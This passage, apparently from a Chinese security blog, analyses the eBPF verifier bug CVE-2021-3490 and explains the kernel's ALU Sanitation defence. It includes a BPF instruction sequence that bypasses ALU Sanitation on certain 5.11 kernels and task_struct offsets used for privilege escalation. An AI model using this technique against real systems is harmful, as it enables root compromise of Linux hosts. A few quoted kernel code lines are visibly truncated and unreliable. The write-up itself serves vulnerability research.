**r6 += r5分析** ：目前寄存器状态，r6—`u32_min_value=2, u32_max_value=1, var_off = {mask
= 0x100000000; value = 0x1}`，r5—`u32_min_value=0, u32_max_value=1, var_off =
{mask = 0xFFFFFFFF00000001; value = 0x0}`。
    static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,
                                          struct bpf_insn *insn,
                                          struct bpf_reg_state 
                                                 *dst_reg,
                                          struct bpf_reg_state src_reg)
    {
      ...
        switch (opcode) {
            case BPF_ADD:
                scalar32_min_max_add(dst_reg, &src_reg);        // [1] var_off = tnum_add(dst_reg->var_off, 
                                            src_reg.var_off);
                break;
    ...
        __update_reg_bounds(dst_reg);                            // [2]
        __reg_deduce_bounds(dst_reg);                            // [3]
        __reg_bound_offset(dst_reg);                            // [4]
        return 0;
    }
    // [1] 由于r5的低32位是0或1，r6的低32位是1，所以相加结果为1或2，所以低32位的1、2位都为unknown。其mask=0xffffffff 00000003
    static void scalar32_min_max_add(struct bpf_reg_state *dst_reg,
                                     struct bpf_reg_state *src_reg)
    {
        s32 smin_val = src_reg->s32_min_value;
        s32 smax_val = src_reg->s32_max_value;
        u32 umin_val = src_reg->u32_min_value;
        u32 umax_val = src_reg->u32_max_value;
    ...
        if (dst_reg->u32_min_value + umin_val u32_max_value + umax_val u32_min_value = 0;
                dst_reg->u32_max_value = U32_MAX;
            } else {
                dst_reg->u32_min_value += umin_val;                // 没越界则直接相加，min+min, max+max
                dst_reg->u32_max_value += umax_val;
            }
    }
接着 `adjust_scalar_min_max_vals()` 会调用
`__update_reg_bounds()`、`__reg_deduce_bounds()`、`__reg_bound_offset()`。
  * `__update_reg32_bounds()`中，`var_off` 表示低32位，`reg->u32_min_value = max{2, 0} = 2`，`reg->u32_max_value = min{2, 0 | 0x3} = 2`（`var32_off.mask = 3`）。
  * `__reg32_deduce_bounds()` 未做修改，因为 `signed 32` 和 `unsigned 32`都相等。
  * `__reg32_deduce_bounds()` 中，`tnum_range()`返回常数2（因为`u32_min_value = u32_max_value=2`该范围内只有2），由于`reg->var_off.mask = 0x3`，所以 `tnum_intersect()` 返回低2位是 known且为2。
最终得到 `r6: {u,s}32_min_value = {u,s}32_max_value = 2, var_off = {mask =
0xFFFFFFFF00000000; value = 0x2}`。
    // [2] __update_reg32_bounds()
    reg->u32_min_value = max_t(u32, reg->u32_min_value,
                              (u32)var32_off.value);
    reg->u32_max_value = min(reg->u32_max_value,
                             (u32)(var32_off.value | var32_off.mask));    // var32_off.mask=0x3
    // [4] __reg32_deduce_bounds()
    struct tnum var32_off = tnum_intersect(tnum_subreg(reg->var_off),    // tnum_subreg取低32位
                                         tnum_range(reg->u32_min_value, // 根据min、max返回一个tnum结构
                                         reg->u32_max_value));
    struct tnum tnum_intersect(struct tnum a, struct tnum b)
    {
        u64 v, mu;
        v = a.value | b.value;                                            // 简单的整合
        mu = a.mask & b.mask;
        return TNUM(v & ~mu, mu);
    }
此时的 r6—`{mask = 0xFFFFFFFF00000000; value = 0x2} verifier:2
runtime:1`，只需取低32位并 `AND 1`，即可得到 `verifier:0 runtime:1`。
####  2-3 提权
后面的利用步骤和CVE-2021-31440一样，参照 [CVE-2021-31440
eBPF边界计算错误漏洞](https://bsauce.github.io/2021/06/09/CVE-2021-31440/) 的exp即可提权。
* * *
## 3\. 漏洞利用 Linux v5.11.8 – 5.11.16 版本
**特点** ：我们采用 `Linux v5.11.16` 版本的内核进行测试，Ubuntu
21.04就是这个版本。2021年3月修复了一个`verifier`计算`alu_limit`（与`ALU
Sanitation`安全机制有关）时的整数溢出漏洞——[commit
10d2bb2e6b1d8c](https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/patch/?id=10d2bb2e6b1d8c4576c56a748f697dbeb8388899)，导致
`Linux 5.11.8 - 5.11.16` 这个版本区间的内核无法利用成功。当`alu_limit =
0`时会触发该漏洞，例如，当对map地址指针进行减法操作时（之前exp这么写，是为了构造越界访问，如泄露内核基址，或者修改map内存之前的
`bpf_map` 结构），会加入如下sanitation指令：`0-1` 将得到 `aux→alu_limit = 0xFFFFFFFF`。
    *patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit - 1);
这个漏洞的存在，导致`ALU Sanitation`机制失效了，因为 `alu_limit`
变得很大了，检测不到越界访问，所以之前那些公开的exp都能利用成功。但是这个漏洞被修复以后，就需要绕过这个限制，需要多加5条指令来绕过该机制。
**绕过该ALU Sanitation**
：`r7`指向map，`r6`是`verifier`以为是0而运行时为1的那个值。需要在r7指针进行运算前，使`alu_limit != 0`。
  * （1）`r8 = r6` 先拷贝一下—— `r8 verifier:0 runtime:1`。
  * （2）`r7 += 0x1000`，map指针加上一个常量，以设置`alu_limit=0x1000`，这样就能绕过运行时的`ALU Sanitation`。
  * （3）`r8 = r8 * 0xfff`—— `r8 verifier:0 runtime:0xfff`。
  * （4）`r7 -= r8`， 由于`verifier`以为r8等于0，所以`alu_limit`保持不变。
  * （5）`r7 -= r6` —— `r7 verifier:map+0x1000 runtime:map`。
**注意** ：
  * 创建map时必须足够大，调用`syscall(__NR_BPF, BPF_MAP_CREATE, ...)`时第3个参数 `bpf_attr->value_size`要大于0x1000，不然执行第2条指令时就会报指针越界的错误。 
                BPF_MOV64_REG(BPF_REG_8, BPF_REG_6),                     // 1-1. (bf) r8 = r6  BPF_REG_3 = BPF_REG_6   !!! 1-1 -> 1-5  是为了绕过alu_limit的限制
            BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),                // 1-2. (07) r7 += 0x1000                !!! 注意，map不能过小，小于0x1000 就报错
            BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0xfff),                // 1-3. verifier: r8=0;    runtime: r8=0x1000-1
            BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),            // 1-4. r7 -= r8
            BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_6),             // 1-5. r7 -= r6
  * 和`Linux v5.11` 版本相比，还需要修改cred search的相关偏移： 
        gef➤  p/x &(*(struct task_struct *)0)->pid
    $9 = 0x918
    gef➤  p/x &(*(struct task_struct *)0)->cred
    $10 = 0xad8
    gef➤  p/x &(*(struct task_struct *)0)->tasks
    $11 = 0x818
* * *
## 4\. 漏洞利用 Linux v5.11.16以后的版本
**特点** ：目前无法绕过最新的`ALU Sanitation`保护机制。2021年4月`ALU Sanitation`引入新的
patch—[commit
7fedb63a8307](https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0)，新增了两个特性。
  * 一是`alu_limit`计算方法变了，不再用指针寄存器的位置来计算，而是使用offset寄存器。例如，假设有个寄存器的无符号边界是 `umax_value = 1, umin_value = 0`，则计算出 `alu_limit = 1`，表示如果该寄存器在运行时超出边界，则指针运算不会使用该寄存器。
  * 二是在runtime时会用立即数替换掉 `verifier` 认定为常数的寄存器。例如，`BPF_ALU64_REG(BPF_ADD, BPF_REG_2, EXPLOIT_REG)` ，`EXPLOIT_REG`被verifier认定为0，但运行时为1，则 将该指令改为 `BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0)`。这个补丁本来是为了防侧信道攻击，同时也阻止了 `CVE-2021-3490` 漏洞的利用。 
        // 以下补丁可看出，如果不确定offset寄存器是否为常量，则根据其alu_limit进行检查；如果确定其为常量，则用其常量值将其操作patch为立即数指令。
    bool off_is_imm = tnum_is_const(off_reg->var_off);
    alu_state |= off_is_imm ? BPF_ALU_IMMEDIATE : 0;
    isimm = aux->alu_state & BPF_ALU_IMMEDIATE;
    ...
    if (isimm) {
            *patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux->alu_limit);
        } else {
             // Patch alu_limit check instructions
             ....
         }
检查发现，v5.11.17 已打该补丁，v5.11.16 未打该补丁。所以 **v5.11.16 以上版本的内核就无法利用漏洞进行越界读写**
，不知道以后能不能绕过这个限制。
* * *
## 5\. ALU Sanitation机制
**原理** ：`ALU
sanitation`机制一直在进行更新，其目的是为了阻止`verifier`漏洞的利用，原理是在runtime运行时检查BPF指令的操作数，防止指针运算越界导致越界读写，其实是对`verifier`静态范围检查起到了补充的作用。
如果某条ALU运算指令的操作数是1个指针和1个标量，则计算`alu_limit`
也即最大绝对值，就是该指针可以进行加减的安全范围。在该指令之前必须加上如下指令，`off_reg`表示与指针作运算的标量寄存器，`BPF_REG_AX`是辅助寄存器。
  * （1）将`alu_limit`载入`BPF_REG_AX`。
  * （2）`BPF_REG_AX = alu_limit - off_reg`，如果 `off_reg > alu_limit`，则`BPF_REG_AX`最高位符号位置位。
  * （3）若`BPF_REG_AUX`为正，`off_reg`为负，则表示`alu_limit`和寄存器的值符号相反，则`BPF_OR`操作会设置该符号位。
  * （4）`BPF_NEG`会使符号位置反，1->0，0->1。
  * （5）`BPF_ARSH`算术右移63位，`BPF_REG_AX`只剩符号位。
  * （6）根据以上运算结果，`BPF_AND`要么清零`off_reg`要么使其不变。
总体看来，如果`off_reg > alu_limit`
或者二者符号相反，表示有可能发生指针越界，则`off_reg`会被替换为0，清空指针运算。反之，如果标量在合理范围内—`0 alu_limit);
    *patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);
    *patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);
    *patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, 0);
    *patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, 63);
    *patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);
**最近更新** ：最近更新了`alu_limit`的计算方法，见[commit
7fedb63a8307d](https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0)，这里我们对比一下更新前后的计算差异。
  * 之前：`alu_limit`由指针寄存器的边界确定，如果指针指向map的开头，则`alu_limit`可减的大小为0，可加的大小为 `map size-1`，并且`alu_limit`随着接下来的指针运算而更新。
  * 现在：`alu_limit`由`offset`寄存器的边界来确定，将运行时offset寄存器的值与`verifier`静态范围追踪时计算出来的边界进行比较。
* * *
## 参考
[Kernel Pwning with eBPF: a Love
Story](https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story)